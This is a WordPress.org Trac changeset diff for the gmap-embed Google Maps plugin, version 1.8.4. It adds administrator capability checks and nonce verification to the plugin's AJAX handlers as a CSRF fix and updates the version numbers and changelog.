  | 67 | 67 | 'ajax\_nonce' => wp\_create\_nonce('ajax\_nonce'), |
  |  | 68 | 'c\_s\_nonce' => wp\_create\_nonce('c\_s\_nonce'), |
  | 68 | 69 | ); |
  | 69 | 70 |  |
* ## [gmap-embed/trunk/includes/traits/MapCRUD.php](/changeset/2667376/gmap-embed/trunk/includes/traits/MapCRUD.php "Show the changeset 2667376 restricted to gmap-embed/trunk/includes/traits/MapCRUD.php")

  | [r2644061](/browser/gmap-embed/trunk/includes/traits/MapCRUD.php?rev=2644061#L18 "Show revision 2644061 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/includes/traits/MapCRUD.php?rev=2667376#L18 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 18 | 18 | public function wgm\_get\_all\_maps() |
  | 19 | 19 | { |
  |  | 20 | if (!current\_user\_can('administrator')) { |
  |  | 21 | echo json\_encode(array( |
  |  | 22 | 'responseCode' => 0, |
  |  | 23 | 'message' => 'Unauthorized access tried.' |
  |  | 24 | )); |
  |  | 25 | wp\_die(); |
  |  | 26 | } |
  |  | 27 | if (!wp\_verify\_nonce(sanitize\_text\_field(esc\_html($\_GET['ajax\_nonce'])), 'ajax\_nonce')) { |
  |  | 28 | die ('Busted!'); |
  |  | 29 | } |
  | 20 | 30 | $args = array( |
  | 21 | 31 | 'post\_type' => 'wpgmapembed', |
  | […](/browser/gmap-embed/trunk/includes/traits/MapCRUD.php?rev=2644061#L68) | […](/browser/gmap-embed/trunk/includes/traits/MapCRUD.php?rev=2667376#L78) |  |
  | 68 | 78 | wp\_die(); |
  | 69 | 79 | } |
  |  | 80 | if (!wp\_verify\_nonce(sanitize\_text\_field(esc\_html($\_POST['c\_s\_nonce'])), 'c\_s\_nonce')) { |
  |  | 81 | die ('Busted!'); |
  |  | 82 | } |
  | 70 | 83 | $error = ''; |
  | 71 | 84 | // Getting ajax fileds value |
  | […](/browser/gmap-embed/trunk/includes/traits/MapCRUD.php?rev=2644061#L138) | […](/browser/gmap-embed/trunk/includes/traits/MapCRUD.php?rev=2667376#L151) |  |
  | 138 | 151 | public function load\_popup\_wpgmapembed\_list() |
  | 139 | 152 | { |
  |  | 153 | if (!current\_user\_can('administrator')) { |
  |  | 154 | echo json\_encode(array( |
  |  | 155 | 'responseCode' => 0, |
  |  | 156 | 'message' => 'Unauthorized access tried.' |
  |  | 157 | )); |
  |  | 158 | wp\_die(); |
  |  | 159 | } |
  |  | 160 | if (!wp\_verify\_nonce(sanitize\_text\_field(esc\_html($\_POST['data']['c\_s\_nonce'])), 'c\_s\_nonce')) { |
  |  | 161 | die ('Busted!'); |
  |  | 162 | } |
  | 140 | 163 | $content = ''; |
  | 141 | 164 | $args = array( |
  | […](/browser/gmap-embed/trunk/includes/traits/MapCRUD.php?rev=2644061#L215) | […](/browser/gmap-embed/trunk/includes/traits/MapCRUD.php?rev=2667376#L238) |  |
  | 215 | 238 | wp\_die(); |
  | 216 | 239 | } |
  |  | 240 | if (!wp\_verify\_nonce(sanitize\_text\_field(esc\_html($\_POST['c\_s\_nonce'])), 'c\_s\_nonce')) { |
  |  | 241 | die ('Busted!'); |
  |  | 242 | } |
  | 217 | 243 | $meta\_data = array( |
  | 218 | 244 | 'wpgmap\_title', |
* ## [gmap-embed/trunk/includes/traits/MarkerCRUD.php](/changeset/2667376/gmap-embed/trunk/includes/traits/MarkerCRUD.php "Show the changeset 2667376 restricted to gmap-embed/trunk/includes/traits/MarkerCRUD.php")

  | [r2654634](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2654634#L48 "Show revision 2654634 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2667376#L48 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 48 | 48 | } |
  | 49 | 49 |  |
  |  | 50 | if (!wp\_verify\_nonce(sanitize\_text\_field(esc\_html($\_POST['ajax\_nonce'])), 'ajax\_nonce')) { |
  |  | 51 | die ('Busted!'); |
  |  | 52 | } |
  |  | 53 |  |
  | 50 | 54 | global $wpdb; |
  | 51 | 55 | $marker\_data = $\_POST['map\_markers\_data']; |
  | […](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2654634#L131) | […](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2667376#L135) |  |
  | 131 | 135 | echo json\_encode($returnArray); |
  | 132 | 136 | wp\_die(); |
  |  | 137 | } |
  |  | 138 | if (!wp\_verify\_nonce(sanitize\_text\_field(esc\_html($\_POST['ajax\_nonce'])), 'ajax\_nonce')) { |
  |  | 139 | die ('Busted!'); |
  | 133 | 140 | } |
  | 134 | 141 |  |
  | […](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2654634#L210) | […](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2667376#L217) |  |
  | 210 | 217 | wp\_die(); |
  | 211 | 218 | } |
  |  | 219 | if (!wp\_verify\_nonce(sanitize\_text\_field(esc\_html($\_GET['ajax\_nonce'])), 'ajax\_nonce')) { |
  |  | 220 | die ('Busted!'); |
  |  | 221 | } |
  | 212 | 222 | ob\_start(); |
  | 213 | 223 | require\_once WGM\_PLUGIN\_PATH . 'admin/includes/markers-icons.php'; |
  | […](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2654634#L228) | […](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2667376#L238) |  |
  | 228 | 238 | echo json\_encode($returnArray); |
  | 229 | 239 | wp\_die(); |
  |  | 240 | } |
  |  | 241 | if (!wp\_verify\_nonce(sanitize\_text\_field(esc\_html($\_POST['data']['ajax\_nonce'])), 'ajax\_nonce')) { |
  |  | 242 | die ('Busted!'); |
  | 230 | 243 | } |
  | 231 | 244 |  |
  | […](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2654634#L356) | […](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2667376#L369) |  |
  | 356 | 369 | )); |
  | 357 | 370 | wp\_die(); |
  |  | 371 | } |
  |  | 372 | if (!wp\_verify\_nonce(sanitize\_text\_field(esc\_html($\_GET['ajax\_nonce'])), 'ajax\_nonce')) { |
  |  | 373 | die ('Busted!'); |
  | 358 | 374 | } |
  | 359 | 375 | $return\_json = array(); |
  | […](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2654634#L396) | […](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2667376#L412) |  |
  | 396 | 412 | wp\_die(); |
  | 397 | 413 | } |
  |  | 414 | if (!wp\_verify\_nonce(sanitize\_text\_field(esc\_html($\_POST['data']['ajax\_nonce'])), 'ajax\_nonce')) { |
  |  | 415 | die ('Busted!'); |
  |  | 416 | } |
  | 398 | 417 |  |
  | 399 | 418 | $marker\_id = sanitize\_text\_field(esc\_html($\_POST['data']['marker\_id'])); |
  | […](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2654634#L423) | […](/browser/gmap-embed/trunk/includes/traits/MarkerCRUD.php?rev=2667376#L442) |  |
  | 423 | 442 | wp\_die(); |
  | 424 | 443 | } |
  |  | 444 | if (!wp\_verify\_nonce(sanitize\_text\_field(esc\_html($\_POST['data']['ajax\_nonce'])), 'ajax\_nonce')) { |
  |  | 445 | die ('Busted!'); |
  |  | 446 | } |
  | 425 | 447 | global $wpdb; |
  | 426 | 448 | $marker\_id = sanitize\_text\_field(esc\_html(($\_POST['data']['marker\_id']))); |
* ## [gmap-embed/trunk/includes/traits/SetupWizard.php](/changeset/2667376/gmap-embed/trunk/includes/traits/SetupWizard.php "Show the changeset 2667376 restricted to gmap-embed/trunk/includes/traits/SetupWizard.php")

  | [r2641450](/browser/gmap-embed/trunk/includes/traits/SetupWizard.php?rev=2641450#L28 "Show revision 2641450 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/includes/traits/SetupWizard.php?rev=2667376#L28 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 28 | 28 | wp\_die(); |
  | 29 | 29 | } |
  |  | 30 | if (!wp\_verify\_nonce(sanitize\_text\_field(esc\_html($\_POST['ajax\_nonce'])), 'ajax\_nonce')) { |
  |  | 31 | die ('Busted!'); |
  |  | 32 | } |
  | 30 | 33 | $api\_key = isset($\_POST['wgm\_api\_key']) ? sanitize\_text\_field(esc\_html($\_POST['wgm\_api\_key'])) : ''; |
  | 31 | 34 | $language = isset($\_POST['wgm\_language']) ? sanitize\_text\_field(esc\_html($\_POST['wgm\_language'])) : ''; |
* ## [gmap-embed/trunk/readme.txt](/changeset/2667376/gmap-embed/trunk/readme.txt "Show the changeset 2667376 restricted to gmap-embed/trunk/readme.txt")

  | [r2654638](/browser/gmap-embed/trunk/readme.txt?rev=2654638#L4 "Show revision 2654638 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/readme.txt?rev=2667376#L4 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 4 | 4 | Tags: google map, map, maps, google maps, map markers, google map plugin, google map embed, google maps plugin, wp google map, map plugin, map embed, best google maps, store locator, map direction, map widget, street view |
  | 5 | 5 | Requires at least: 2.9 |
  | 6 |  | Tested up to: 5.~~8~~ |
  | 7 |  | Version: 1.8.~~3~~ |
  | 8 |  | Stable tag: 1.8.~~3~~ |
  |  | 6 | Tested up to: 5.9 |
  |  | 7 | Version: 1.8.4 |
  |  | 8 | Stable tag: 1.8.4 |
  | 9 | 9 | Requires PHP: 5.3 |
  | 10 | 10 | Text Domain: gmap-embed |
  | […](/browser/gmap-embed/trunk/readme.txt?rev=2654638#L200) | […](/browser/gmap-embed/trunk/readme.txt?rev=2667376#L200) |  |
  | 200 | 200 | == Changelog == |
  | 201 | 201 |  |
  |  | 202 | = 1.8.4 = |
  |  | 203 | \* CSRF issue fixing |
  |  | 204 | \* Tabs UI update |
  |  | 205 | \* Marker Icon preview issue fixing |
  |  | 206 | \* DB query and code optimized |
  |  | 207 |  |
  | 202 | 208 | = 1.8.3 = |
  | 203 | 209 | \* Ajax Security issues resolved |
* ## [gmap-embed/trunk/srm\_gmap\_embed.php](/changeset/2667376/gmap-embed/trunk/srm_gmap_embed.php "Show the changeset 2667376 restricted to gmap-embed/trunk/srm_gmap_embed.php")

  | [r2654638](/browser/gmap-embed/trunk/srm_gmap_embed.php?rev=2654638#L8 "Show revision 2654638 of this file in browser") | [r2667376](/browser/gmap-embed/trunk/srm_gmap_embed.php?rev=2667376#L8 "Show revision 2667376 of this file in browser") |  |
  | --- | --- | --- |
  | 8 | 8 | Domain Path: /languages |
  | 9 | 9 | Author URI: https://www.srmilon.info?utm\_source=wp-plugins&utm\_campaign=author-uri&utm\_medium=wp-dash |
  | 10 |  | Version: 1.8.~~3~~ |
  |  | 10 | Version: 1.8.4 |
  | 11 | 11 | \*/ |
  | 12 | 12 |  |
  | […](/browser/gmap-embed/trunk/srm_gmap_embed.php?rev=2654638#L17) | […](/browser/gmap-embed/trunk/srm_gmap_embed.php?rev=2667376#L17) |  |
  | 17 | 17 | } |
  | 18 | 18 |  |
  | 19 |  | define('WGM\_PLUGIN\_VERSION', '1.8.~~3~~'); |
  |  | 19 | define('WGM\_PLUGIN\_VERSION', '1.8.4'); |
  | 20 | 20 | define('WGM\_PLUGIN\_PATH', trailingslashit(plugin\_dir\_path(\_\_FILE\_\_))); |
  | 21 | 21 | define('WGM\_PLUGIN\_URL', trailingslashit(plugins\_url('/', \_\_FILE\_\_))); |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2667376)
* [Zip Archive](?format=zip&new=2667376)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


